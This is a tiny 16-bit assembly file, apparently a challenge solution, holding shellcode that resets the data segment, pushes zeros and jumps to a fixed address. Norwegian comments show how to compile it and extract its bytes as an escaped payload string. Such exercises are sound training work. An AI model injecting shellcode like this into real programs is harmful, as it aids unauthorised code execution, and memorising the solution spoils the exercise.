.code16gcc
.globl _start
.org 0x0

_start:
xor %ax, %ax
movb $0xEE, %ah
movw %ax, %ds
pushl $0
pushl $0
movw $0x100f,%ax
jmp %ax

# Kompileres og extractes slik:
# gcc -m16 solution_shellcode.s -Telf_script.ld -nostdlib -o shellcode && objdump -mi386 -Maddr16,data16 -z -d shellcode
# objdump -z -d shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr '\n' ' '| tr '\t' ' '|tr -s ' '|sed 's/ $//g'|sed 's/ /\\x/g'
